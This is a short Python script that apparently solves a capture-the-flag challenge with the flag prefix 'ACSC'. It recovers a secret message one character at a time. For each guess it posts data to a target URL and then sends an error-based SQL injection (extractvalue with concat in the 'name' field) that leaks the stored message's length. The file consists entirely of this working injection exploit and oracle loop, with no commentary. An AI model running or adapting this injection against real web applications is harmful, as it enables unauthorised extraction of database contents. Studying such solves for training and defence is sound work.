import requests, string, sys

URL = sys.argv[1]
RPEFIX = 'ACSC'

for _ in range(32):
    maps = {}
    for i in string.printable:
        guess = RPEFIX + i
        data = {
            'name': 'orange', 
            'msg': guess + '|' + guess + "^" + guess
        }

        r = requests.post(URL, data=data)
        _id = int(r.content.strip('#'))
        data = {
            'name': "1'^if(1=1, extractvalue('1',concat('~',(select length(msg) from (select * from msgs where id=%d)x))) ,1))-- " % _id, 
            'msg': 'noggnoggnogg'
        }
        r = requests.post(URL, data=data)
        length = r.content.split("~")[1].strip("'")
        maps[i] = int(length)

    which = min(maps, key=maps.get)
    RPEFIX = RPEFIX + which
    print RPEFIX